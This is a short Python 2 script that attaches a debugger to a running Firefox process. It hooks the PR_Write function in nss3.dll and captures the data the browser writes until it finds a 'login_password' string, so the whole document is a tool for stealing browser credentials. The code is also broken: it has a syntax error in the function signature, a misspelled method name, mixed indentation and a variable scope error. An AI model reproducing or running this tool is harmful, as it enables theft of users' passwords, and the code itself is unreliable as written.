from winappdbg import Debug, EventHandler, Process, System

store = ''

def PR_Write(event, ra, arg1, arg2. arg3):
	# arg 2 is the memory pointer addr for data
    # arg 3 is the size of data 
    # See https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR/Reference/PR_Write
    global store 
    store =  store + process.read(arg2, 1024)

	if 'login_password' in store:

		print "Password found debugging stopping..."
		try:
			debug.stop()
		except Exception, e:
			pass

class MyEventHandler( EventHandler ):

	def load_dll(self, event):
		module = event.get_module()

		if module.match_name("nss3.dll"):
			pid = event.get_pid()
			address = module.reslove("PR_Write")
			print "The functions address in memory is: ", address
			event.debug.hook_function(pid, address, preCB=PR_Write, postCB=None, paramCount=3, signature=None)

debug = Debug(MyEventHandler())
try:
	for(process, name) in debug.system.find_processes_by_filename("firefox.exe"):
		print 'Firefox PID is: ' + str(process.get_pid())
	debug.attach(process.get_pid())
	debug.loop()
finally:
	debug.stop()